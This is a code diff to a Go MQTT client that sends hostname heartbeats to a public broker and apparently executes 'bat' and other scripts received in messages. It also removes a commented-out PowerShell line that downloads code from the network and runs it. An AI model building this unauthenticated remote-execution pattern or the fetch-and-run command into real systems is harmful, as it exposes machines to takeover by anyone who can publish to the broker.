@@ -1,7 +1,7 @@
 // author: andy.hu
 // email:andy.hu.sheng@gmail.com
 // date: 2024/1/5 16:11
-// version: v1.1
+// version: v1.1.2
 // change log: 1.UPDATE AAAA BBBB MD5 VALUE
 
 package main
@@ -9,6 +9,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"log"
 	"runtime"
 	"time"
 
@@ -23,7 +24,7 @@ type Message struct {
 
 var messagePubHandler mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
 
-	fmt.Println(msg.Topic())
+	log.Println("Recv Topic IS ::::", msg.Topic())
 
 	var message Message
 	err := json.Unmarshal(msg.Payload(), &message)
@@ -31,9 +32,7 @@ var messagePubHandler mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Me
 		fmt.Println("error:", err)
 		return
 	}
-
 	// HANDLER for OS:
-
 	if runtime.GOOS == message.OS {
 		switch T := message.Type; T {
 		case "bat":
@@ -92,6 +91,7 @@ var messagePubHandler mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Me
 }
 
 func main() {
+
 	var broker = "broker.emqx.io"
 	var port = 1883
 	opts := mqtt.NewClientOptions()
@@ -106,19 +106,11 @@ func main() {
 	if token := client.Connect(); token.Wait() && token.Error() != nil {
 		panic(token.Error())
 	}
-
-	// TODO: NEED TO UPDATE!!!!
-	// strUpdateCmd := "irm utools.run/agent | iex"
-	// check_update(strUpdateCmd)
-
-	//TODO: REPLACE TICKET;
-
 	for {
 		now := time.Now()
 		publish_live(client, fmt.Sprintf("Time:%s,Hostname:%s is alive", now.Format("2006-01-02 15:04:05"), get_hostname()))
-		time.Sleep(30 * time.Second)
+		time.Sleep(35 * time.Second)
 		subscript_opera(client)
 		subscript_update(client)
-
 	}
 }
